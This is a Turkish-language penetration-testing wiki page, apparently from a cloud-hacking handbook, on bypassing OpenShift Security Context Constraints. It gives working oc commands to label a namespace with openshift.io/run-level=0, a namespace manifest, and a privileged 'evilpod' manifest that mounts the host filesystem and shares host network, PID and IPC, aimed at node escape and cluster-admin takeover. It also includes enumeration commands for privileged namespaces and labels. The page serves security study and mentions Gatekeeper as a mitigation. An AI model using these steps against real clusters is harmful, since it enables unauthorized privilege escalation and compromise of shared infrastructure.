# Openshift - SCC bypass

**Bu sayfanın orijinal yazarı** [**Guillaume**](https://www.linkedin.com/in/guillaume-chapela-ab4b9a196)

## Ayrıcalıklı İsim Alanları

Varsayılan olarak, SCC aşağıdaki projelere uygulanmaz:

- **default**
- **kube-system**
- **kube-public**
- **openshift-node**
- **openshift-infra**
- **openshift**

Bu isim alanlarından birinde pod'lar dağıtırsanız, SCC uygulanmayacak ve ayrıcalıklı pod'ların dağıtımına veya ana bilgisayar dosya sisteminin bağlanmasına izin verilecektir.

## İsim Alanı Etiketi

RedHat belgelerine göre, pod'unuzda SCC uygulamasını devre dışı bırakmanın bir yolu vardır. Aşağıdaki izinlerden en az birine sahip olmanız gerekecektir:

- Bir İsim Alanı Oluşturun ve Bu İsim Alanında Bir Pod Oluşturun
- Bir İsim Alanını Düzenleyin ve Bu İsim Alanında Bir Pod Oluşturun
```bash
$ oc auth can-i create namespaces
yes

$ oc auth can-i patch namespaces
yes
```
`openshift.io/run-level` etiketinin belirli bir kullanımı, kullanıcıların uygulamalar için SCC'leri aşmalarını sağlar. RedHat belgelerine göre, bu etiket kullanıldığında, o ad alanındaki tüm pod'lar üzerinde hiçbir SCC uygulanmaz, bu da herhangi bir kısıtlamayı etkili bir şekilde ortadan kaldırır.

<figure><img src="../../../images/Openshift-RunLevel4.png" alt=""><figcaption></figcaption></figure>

## Etiket Ekle

Ad alanınıza etiketi eklemek için :
```bash
$ oc label ns MYNAMESPACE openshift.io/run-level=0
```
Bir YAML dosyası aracılığıyla etiket ile bir ad alanı oluşturmak için:
```yaml
apiVersion: v1
kind: Namespace
metadata:
name: evil
labels:
openshift.io/run-level: 0
```
Artık, ad alanında oluşturulan tüm yeni pod'ların herhangi bir SCC'si olmamalıdır.

<pre class="language-bash"><code class="lang-bash"><strong>$ oc get pod -o yaml | grep 'openshift.io/scc'
</strong><strong>$
</strong></code></pre>

SCC'nin yokluğunda, pod tanımınız üzerinde herhangi bir kısıtlama yoktur. Bu, kötü niyetli bir pod'un ana sistemde kaçmak için kolayca oluşturulabileceği anlamına gelir.
```yaml
apiVersion: v1
kind: Pod
metadata:
name: evilpod
labels:
kubernetes.io/hostname: evilpod
spec:
hostNetwork: true #Bind pod network to the host network
hostPID: true #See host processes
hostIPC: true #Access host inter processes
containers:
- name: evil
image: MYIMAGE
imagePullPolicy: IfNotPresent
securityContext:
privileged: true
allowPrivilegeEscalation: true
resources:
limits:
memory: 200Mi
requests:
cpu: 30m
memory: 100Mi
volumeMounts:
- name: hostrootfs
mountPath: /mnt
volumes:
- name: hostrootfs
hostPath:
path:
```
Şimdi, ana sistemin erişim haklarını artırmak ve ardından tüm kümeyi ele geçirmek, 'cluster-admin' ayrıcalıkları kazanmak daha kolay hale geldi. Aşağıdaki sayfada **Node-Post Exploitation** kısmını arayın:

{{#ref}}
../../kubernetes-security/attacking-kubernetes-from-inside-a-pod.md
{{#endref}}

### Özel etiketler

Ayrıca, hedef kurulumuna bağlı olarak, bazı özel etiketler / açıklamalar, önceki saldırı senaryosunda olduğu gibi kullanılabilir. Yapılmamış olsa bile, etiketler izin vermek, belirli bir kaynağı kısıtlamak veya kısıtlamamak için kullanılabilir.

Bazı kaynakları okuyabiliyorsanız özel etiketleri aramaya çalışın. İşte ilginç kaynakların bir listesi:

- Pod
- Deployment
- Namespace
- Service
- Route
```bash
$ oc get pod -o yaml | grep labels -A 5
$ oc get namespace -o yaml | grep labels -A 5
```
## Tüm ayrıcalıklı ad alanlarını listele
```bash
$ oc get project -o yaml | grep 'run-level' -b5
```
## Advanced exploit

OpenShift'te, daha önce gösterildiği gibi, `openshift.io/run-level` etiketine sahip bir ad alanında bir pod dağıtma iznine sahip olmak, kümenin kolayca ele geçirilmesine yol açabilir. Bir küme ayarları perspektifinden, bu işlevsellik **devre dışı bırakılamaz**, çünkü OpenShift'in tasarımına içkindir.

Ancak, **Open Policy Agent GateKeeper** gibi hafifletme önlemleri, kullanıcıların bu etiketi ayarlamasını engelleyebilir.

GateKeeper'ın kurallarını aşmak ve bu etiketi ayarlayarak bir küme ele geçirme işlemini gerçekleştirmek için, **saldırganların alternatif yöntemler belirlemesi gerekecektir.**

## References

- [https://docs.openshift.com/container-platform/4.8/authentication/managing-security-context-constraints.html](https://docs.openshift.com/container-platform/4.8/authentication/managing-security-context-constraints.html)
- [https://docs.openshift.com/container-platform/3.11/admin_guide/manage_scc.html](https://docs.openshift.com/container-platform/3.11/admin_guide/manage_scc.html)
- [https://github.com/open-policy-agent/gatekeeper](https://github.com/open-policy-agent/gatekeeper)
